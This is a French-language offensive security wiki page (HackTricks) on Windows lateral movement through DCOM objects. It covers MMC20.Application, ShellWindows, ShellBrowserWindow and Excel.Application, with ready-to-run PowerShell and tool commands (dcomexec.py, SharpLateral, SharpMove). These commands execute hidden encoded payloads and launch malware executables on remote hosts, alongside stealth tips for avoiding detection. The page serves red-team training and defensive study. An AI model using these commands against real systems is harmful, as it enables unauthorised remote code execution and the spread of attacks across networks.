# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Le lateral movement DCOM est intéressant car il réutilise les serveurs COM existants exposés via RPC/DCOM au lieu de créer un service ou une tâche planifiée. En pratique, cela signifie que la connexion initiale commence généralement sur TCP/135 puis se déplace vers des ports RPC élevés attribués dynamiquement.

## Prerequisites & Gotchas

- Vous avez généralement besoin d’un contexte d’administrateur local sur la cible et le serveur COM distant doit autoriser le lancement/l’activation à distance.
- Depuis le **14 mars 2023**, Microsoft impose le durcissement DCOM pour les systèmes pris en charge. Les anciens clients qui demandent un niveau d’authentification d’activation faible peuvent échouer à moins de négocier au moins `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Les clients Windows modernes sont généralement relevés automatiquement, donc les outils actuels continuent normalement de fonctionner.
- L’exécution DCOM manuelle ou scriptée nécessite généralement TCP/135 plus la plage de ports RPC dynamiques de la cible. Si vous utilisez `dcomexec.py` d’Impacket et que vous voulez récupérer la sortie de la commande, vous avez généralement aussi besoin d’un accès SMB à `ADMIN$` (ou à un autre partage inscriptible/lisible).
- Si RPC/DCOM fonctionne mais que SMB est bloqué, `dcomexec.py -nooutput` peut quand même être utile pour une exécution aveugle.

Vérifications rapides:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Pour plus d'informations sur cette technique, consultez le post original sur [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Les objets Distributed Component Object Model (DCOM) offrent une capacité intéressante pour les interactions réseau avec des objets. Microsoft fournit une documentation complète pour DCOM et Component Object Model (COM), accessible [ici pour DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) et [ici pour COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Une liste des applications DCOM peut être récupérée à l'aide de la commande PowerShell :
```bash
Get-CimInstance Win32_DCOMApplication
```
L’objet COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permet le scripting des opérations de snap-in MMC. Notamment, cet objet contient une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Plus d’informations sur cette méthode sont disponibles [ici](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Vérifiez son fonctionnement :

Cette fonctionnalité facilite l’exécution de commandes sur un réseau via une application DCOM. Pour interagir à distance avec DCOM en tant qu’admin, PowerShell peut être utilisé comme suit :
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Cette commande se connecte à l'application DCOM et renvoie une instance de l'objet COM. La méthode ExecuteShellCommand peut ensuite être invoquée pour exécuter un processus sur l'hôte distant. Le processus implique les étapes suivantes :

Vérifier les méthodes :
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obtenir RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Le dernier argument est le style de la fenêtre. `7` garde la fenêtre réduite. En pratique, l’exécution basée sur MMC conduit généralement à un processus distant `mmc.exe` qui lance votre payload, ce qui est différent des objets basés sur Explorer ci-dessous.

## ShellWindows & ShellBrowserWindow

**Pour plus d’informations sur cette technique, consultez l’article original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

L’objet **MMC20.Application** a été identifié comme ne disposant pas de "LaunchPermissions" explicites, ce qui lui fait utiliser par défaut des permissions autorisant l’accès aux Administrators. Pour plus de détails, un thread peut être consulté [ici](https://twitter.com/tiraniddo/status/817532039771525120), et l’utilisation de [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET pour filtrer les objets sans Launch Permission explicite est recommandée.

Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en avant en raison de l’absence de Launch Permissions explicites. L’absence d’une entrée de registre `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie qu’il n’existe pas de permissions explicites.

Comparés à `MMC20.Application`, ces objets sont souvent plus discrets du point de vue OPSEC, car la commande se retrouve généralement comme enfant de `explorer.exe` sur l’hôte distant au lieu de `mmc.exe`.

### ShellWindows

Pour `ShellWindows`, qui ne possède pas de ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l’instanciation de l’objet en utilisant son AppID. Ce processus s’appuie sur OleView .NET pour récupérer le CLSID de `ShellWindows`. Une fois instancié, l’interaction est possible via la méthode `WindowsShell.Item`, ce qui conduit à des invocations de méthodes comme `Document.Application.ShellExecute`.

Des commandes PowerShell d’exemple ont été fournies pour instancier l’objet et exécuter des commandes à distance :
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` est similaire, mais vous pouvez l’instancier directement via son CLSID et pivoter vers `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Mouvement latéral avec les objets Excel DCOM

Le mouvement latéral peut être réalisé en exploitant des objets DCOM Excel. Pour des informations détaillées, il est conseillé de lire la discussion sur l’exploitation de Excel DDE pour le mouvement latéral via DCOM sur [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Le projet Empire fournit un script PowerShell, qui démontre l’utilisation de Excel pour l’exécution de code à distance (RCE) en manipulant des objets DCOM. Ci-dessous se trouvent des extraits du script disponible dans le [dépôt GitHub d'Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), montrant différentes méthodes pour abuser de Excel pour RCE :
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Des recherches récentes ont élargi ce domaine avec la méthode `ActivateMicrosoftApp()` de `Excel.Application`. L’idée clé est qu’Excel peut essayer de lancer des applications Microsoft héritées comme FoxPro, Schedule Plus, ou Project en recherchant dans le `PATH` du système. Si un opérateur peut placer un payload avec l’un de ces noms attendus dans un emplacement inscriptible faisant partie du `PATH` de la cible, Excel l’exécutera.

Requirements pour cette variation :

- Local admin sur la cible
- Excel installé sur la cible
- Capacité d’écrire un payload dans un répertoire inscriptible présent dans le `PATH` de la cible

Exemple pratique abusant de la recherche FoxPro (`FOXPROW.exe`) :
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Si l’hôte attaquant n’a pas le ProgID local `Excel.Application` enregistré, instanciez l’objet distant par CLSID à la place :
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Values vus abusés en pratique :

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Outils d'automatisation pour le Lateral Movement

Deux outils sont mis en avant pour automatiser ces techniques :

- **Invoke-DCOM.ps1** : un script PowerShell fourni par le projet Empire qui simplifie l’appel de différentes méthodes pour exécuter du code sur des machines distantes. Ce script est accessible dans le dépôt GitHub d’Empire.

- **SharpLateral** : un outil conçu pour exécuter du code à distance, qui peut être utilisé avec la commande :
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Outils automatiques

- Le script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permet d’invoquer facilement toutes les méthodes commentées pour exécuter du code sur d’autres machines.
- Vous pouvez utiliser `dcomexec.py` d’Impacket pour exécuter des commandes sur des systèmes distants via DCOM. Les builds actuels prennent en charge `ShellWindows`, `ShellBrowserWindow` et `MMC20`, et utilisent par défaut `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Vous pourriez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Vous pourriez aussi utiliser [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
